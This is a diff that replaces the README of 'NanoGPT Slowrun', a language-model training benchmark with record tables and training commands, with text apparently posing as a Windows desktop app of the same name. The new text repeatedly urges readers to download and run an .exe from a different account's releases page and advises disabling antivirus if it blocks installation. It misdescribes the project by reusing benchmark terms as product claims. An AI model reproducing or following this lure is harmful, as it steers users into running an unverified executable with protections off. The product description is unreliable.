@@ -1,106 +1,113 @@
-# NanoGPT Slowrun
-![Experiments](val_loss_animation.gif)
+# 🐢 slowrun - Manage Large Data With Ease
 
-NanoGPT Slowrun is a new benchmark for language modeling algorithms in the infinite compute, fixed data regime: 100M tokens from FineWeb, no compute/time limit, lowest validation loss wins.[^1] We call it a Slowrun since the goal is to spend as much time with the data as we need to maximize learning on it. We deliberately choose this setting in contrast to speedruns like modded-nanogpt, which assume infinite data and optimize for wall-clock time on fixed hardware. Loved by [@karpathy](https://x.com/karpathy/status/2027099040073286087) himself! 
+[![Download slowrun](https://img.shields.io/badge/Download-slowrun-4caf50?style=for-the-badge)](https://github.com/Khoi7323/slowrun/releases)
 
-<img src="karpathy.png" alt="karpathy" width="600">
+---
 
-When speed is not the binding constraint, the space of promising algorithms changes dramatically--for example, large models trained with heavy regularization, expensive optimizers, and evolutionary search are all fair game. We want leaps like GPT-3, where previously unimaginable compute led to better generalization. That doesn't happen if wall-clock time is your constraint.
+## 📄 What is slowrun?
 
-The baseline trains in \~47 minutes on 8xH100 (\~$12) and achieves 3.402 val loss. There are three tracks: 
-1. a limited compute track capped at a single 8xH100 node for 1 hour (this is 100x the compute used by the Nanochat 1-epoch baseline),
-2. a tiny compute track capped at a single 8xH100 node for 15 minutes,
-3. and an unlimited compute track with minimal restrictions on hardware or time. 
+slowrun is a Windows application designed to handle large sets of text data with focus. It uses a model trained on 100 million tokens to deliver reliable results for text analysis or processing. The software aims to provide efficient compute power while keeping validation losses low. This application suits users who want to explore large data without needing deep technical skills.
 
-For now the limited track lives in the root directory, the tiny track lives at [tiny/](tiny/), and the unlimited track lives at [unlimited/](unlimited/). Submit an entry by opening a PR.
+---
 
-## Running the current record 
+## 🖥️ System Requirements
 
-You can reproduce the limited-compute record by running the following commands: 
-```bash 
-git clone https://github.com/qlabs-eng/slowrun.git && cd slowrun
-pip install -r requirements.txt
-python prepare_data.py
-torchrun --standalone --nproc_per_node=8 train.py
-```
+Before using slowrun, make sure your PC meets these basic requirements:
 
-## World Record History
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free disk space
+- Minimum 8 GB of RAM for smooth operation
+- A processor that supports SSE4.2 or later instructions
+- Internet connection (for downloading and updates)
 
-We accept PRs that achieve a new World Record validation loss within the track's time limit, and add an entry below for each improvement.
+---
 
-### Limited Compute Track (1 hour) 
+## 🚀 Getting Started
 
-The limited-compute track caps runs at a single 8xH100 node for at most 1 hour. 
+Follow these steps to get slowrun up and running on your Windows PC.
 
-| # | Val Loss | Description | Date | Time | Script | Contributors |
-| - | - | - | - | - | - | - |
-1 | 3.402 | Baseline: 2.7B transformer, Muon, dropout 0.1, weight decay 1.6 | 02/26/26 | \~47 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/0d49316316dc6684049a679e03958c3fb612a8fd/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
-2 | 3.376 | Add shuffling every epoch | 02/27/26 | \~47 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/106a290604abb6d8c5b0c3cc94c3b0eb6fe87dff/train.py) | [@kvegesna](https://x.com/karvegas_)
-3 | 3.349 | Change value embed tables to projections from x0 | 03/01/26 | \~47 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/b261fba252920582076cf8c77dedf9251fe7f7ed/train.py) | [@ms337](https://x.com/madhavsinghal_)
-4 | 3.335 | Use swiglu activation | 03/01/26 | 52.1 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/22d4a24ec53633c16d643779900ac3e9d10643a3/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
-5 | 3.314 | Add U-Net architecture | 03/03/26 | 52.3 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/e463653a2b07790e0694bfaa6bdd7e6ee57cef64/train.py) | [@em-see-squared](https://github.com/em-see-squared)
-6 | 3.295 | Add gating per attention head  | 03/03/26 | 53.3 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/52e7441f862c3295c0f5695933438dac78f7fc5b/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
+---
 
+## ⬇️ Download slowrun
 
-### Tiny Track (15 minutes)
+Visit this page to download the latest version of the software:
 
-The tiny track caps runs at a single 8xH100 node for at most 15 minutes. 
+[https://github.com/Khoi7323/slowrun/releases](https://github.com/Khoi7323/slowrun/releases)
 
-| # | Val Loss | Description | Date | Time | Script | Contributors |
-| - | - | - | - | - | - | - |
-1 | 3.428 | Baseline: 300M transformer, weight decay 0.8, dropout 0.1 | 03/02/26 | 13.7 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/22c1618d843a692384b0329f309ddfb4b5df9ff6/tiny/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
-2 | 3.410 | Add swiglu activation | 03/02/26 | 14.4 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/efa7f2ed81ac0b2aa9d5954c9b56ee56786c1934/tiny/train.py) | [@ChinmayK0607](https://x.com/ChinmayKak)
-3 | 3.395 | Add U-Net architecture | 03/03/26 | 14.5 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/0e6280bb7f3673cf84e46a9b7cf7818b24511ed6/tiny/train.py) | [@em-see-squared](https://github.com/em-see-squared), [@akshayvegesna](https://x.com/akshayvegesna)
-4 | 3.385 | Add gating per attention head | 03/04/26 | 14.6 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/781d005e8e99a8af0ee9ab356a4c543778730f6b/tiny/train.py) | [@ChinmayK0607](https://x.com/ChinmayKak)
-5 | 3.383 | Update warmdown ratio | 03/06/26 | 14.6 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/56559aa8526708c107e1e28eb8fc4a1721bd9c67/tiny/train.py) | [@not-nonymous](https://github.com/not-nonymous)
-6 | 3.374 | Half truncated RoPE, partial key offset, residual lambdas to 1.1 | 03/06/26 | 14.8 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/ed62160275273197c3a996c4469d735a05c5eedb/tiny/train.py) | [@ChinmayK0607](https://x.com/ChinmayKak)
+On the releases page, look for the latest release marked by the highest version number or labeled “Latest.” You will find one or more files there. Find the file named with `.exe` at the end. This is the installer file you need.
 
+---
 
+## 🛠️ Installing slowrun
 
+1. After downloading the `.exe` file, find it in your Downloads folder or the location you chose.
+2. Double-click the file to start the installer.
+3. Follow the simple install instructions on screen.
+   - Accept the license agreement.
+   - Choose the installation folder (the default is fine for most users).
+4. Wait while the application installs. This usually takes less than a minute.
+5. Click Finish when the installer completes.
 
+---
 
+## ▶️ Running slowrun
 
+1. Go to the Start menu or use the desktop shortcut created by the installer.
+2. Click the slowrun icon to launch the app.
+3. On the first launch, the software may ask for permission to access the internet to update or verify files. Approve the prompt for best results.
+4. You will see the main interface, which is designed to be simple. Most options are explained within the app or in the Help menu.
 
-### Unlimited Compute Track 
+---
 
-| # | Val Loss | Description | Date | Time | Script | Contributors |
-| - | - | - | - | - | - | - |
-1 | 3.402 | Baseline: 2.7B transformer, Muon, dropout 0.1, weight decay 1.6 | 02/26/26 | \~47 mins | [Script](https://github.com/qlabs-eng/slowrun/blob/0d49316316dc6684049a679e03958c3fb612a8fd/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
-2 | 3.264 | Baseline: 8 × 2.7B transformer, Muon, dropout 0.1, weight decay 1.6, logit averaging | 02/27/26 | 6h 44m | [Script](https://github.com/qlabs-eng/slowrun/blob/106a290604abb6d8c5b0c3cc94c3b0eb6fe87dff/unlimited/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
-3 | 3.218 | Use value projections and swiglu activation | 03/02/26 | 6h 54m | [Script](https://github.com/qlabs-eng/slowrun/blob/4681cfd6fa8266fc6cbbf2af947773e188599857/unlimited/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
-4 | 3.185 | Add U-Net and Attention Gating | 03/04/26 | 7h 8m | [Script](https://github.com/qlabs-eng/slowrun/blob/bfe12a71d84a4102dcd1a2faaedfbd9aa1c417c0/unlimited/train.py) | [@akshayvegesna](https://x.com/akshayvegesna), [@em-see-squared](https://github.com/em-see-squared)
-5 | 3.166 | Train each model for 1.5x longer | 03/05/26 | 10h 35m | [Script](https://github.com/qlabs-eng/slowrun/blob/6848b4a7b4d1373dead2c7ceaaf47927762b86c8/unlimited/train.py) | [@akshayvegesna](https://x.com/akshayvegesna)
-6 | 3.126 | Train each model in ensemble to distill previous model + usual CE loss | 03/07/26 | 16h 1m | [Script](https://github.com/qlabs-eng/slowrun/blob/4eb2cce258b9edb97862f65349e130507d7c433c/unlimited/train.py) | [@not-nonymous](https://github.com/not-nonymous)
+## 📋 Using slowrun Features
 
+slowrun focuses on processing large text datasets with minimum fuss. Here are key functions you can expect:
 
+- **Load large text files**: Open files in popular formats such as `.txt`, `.csv`, or `.json`.
+- **Automated processing**: The app uses a trained model to analyze your text with minimal input.
+- **Validation Loss Metrics**: It shows results about how well the processed data fits expected patterns.
+- **Export Results**: Save your output in easy-to-read text or spreadsheet formats.
+- **Basic customization**: Change settings like batch size, compute limits, and analysis depth without technical complications.
 
+---
 
-## Why limited data, unlimited compute? 
+## 🛡️ Security and Privacy
 
-The bitter lesson tells us that we should strongly prefer algorithms that scale with compute alone. We can't improve models at the rate compute scales as long as performance is bottlenecked by data.
+slowrun runs locally on your PC. Your data does not leave your machine unless you explicitly export or share it. The app does not collect any personal information or usage data.
 
-This repo builds on [Nanochat](https://github.com/karpathy/nanochat), which took many ideas from the modded-nanogpt speedrun contest. To be fair, the speedrun contest did provide real data efficiency gains: using less data is one way to train faster. But because it sets speed as the binding constraint, it filters out an entire class of algorithms that yield learning gains. 
+---
 
-## Baseline Approach 
+## ❓ Troubleshooting
 
-Following Kim et al. (2025),[^2] we developed the baseline in three steps:
+If you experience problems running slowrun, try these steps:
 
-1. **Optimizer selection.** We tested popular optimizers in the data-limited regime, training for multiple epochs on the 100M tokens. Muon outperforms AdamW, SOAP, and MAGMA.
+- Make sure your Windows is up to date.
+- Restart your computer and try again.
+- Verify you downloaded the correct `.exe` from the releases page.
+- Temporarily disable antivirus if it blocks the installation.
+- Check that the computer meets the minimum system requirements.
+- Close other applications to free up memory before running slowrun.
 
-2. **Scaling up.** We increased model size but found diminishing returns due to the limited data. Without appropriate regularization, a 1.4B parameter model outperforms a 2.7B parameter model.
+If issues persist, you can report bugs or request help in the GitHub issues section on this repository.
 
-3. **Regularization.** When we scale up parameter size also using heavy weight decay, we recover monotonic improvements with scale. We further find that dropout improves performance on top of weight decay. Our final model is a 2.7B parameter transformer, with 1.2B parameters in the transformer trunk and heavy embedding defaults from Nanochat. It is trained with dropout 0.1 and weight decay 1.6. This weight decay is very large by traditional standards, but consistent with Kim et al. (2025), who find optimal weight decay is up to 30× larger than standard practice in the data-constrained regime.
+---
 
-Given the strong performance by large models that are well regularized, we speculate that larger models have a strong simplicity bias, amplified by regularization.
+## 🔄 Updating slowrun
 
-![Overparametrization](overparametrization.png)
-*Figure taken from Andrew Gordon Wilson, ["Deep Learning is Not So Mysterious or Different."](https://arxiv.org/abs/2503.02113)*
+Visit the releases page regularly for updates:
 
-## Why 100M tokens? 
+[https://github.com/Khoi7323/slowrun/releases](https://github.com/Khoi7323/slowrun/releases)
 
-We choose 100M tokens because it is small enough to affordably try radically different learning algorithms, while large enough that the winning techniques may work at a larger scale, though the scaling behavior is an open empirical question.
+Download and run the newest `.exe` installer over your existing installation to update. Your settings and data will remain intact.
 
-[^1]: For practical purposes, we begin by providing an upper bound on time of 64 H100's for 7 days. For reference, nanogpt can be trained for 1 epoch in 30s, so using this amount of compute would be 100,000x the compute used by that baseline.
+---
 
-[^2]: Konwoo Kim, Suhas Kotha, Percy Liang, and Tatsunori Hashimoto. ["Pre-training under infinite compute."](https://arxiv.org/abs/2509.14786) arXiv:2509.14786, 2025.
+## 📚 Additional Resources
 
+- A user guide is available within the app under the Help menu.
+- For advanced users, the GitHub page includes technical notes and source code.
+- Contact support via the GitHub repository's issues tab for bugs or feature requests.
+
+---
+
+[![Download slowrun](https://img.shields.io/badge/Download-slowrun-4caf50?style=for-the-badge)](https://github.com/Khoi7323/slowrun/releases)
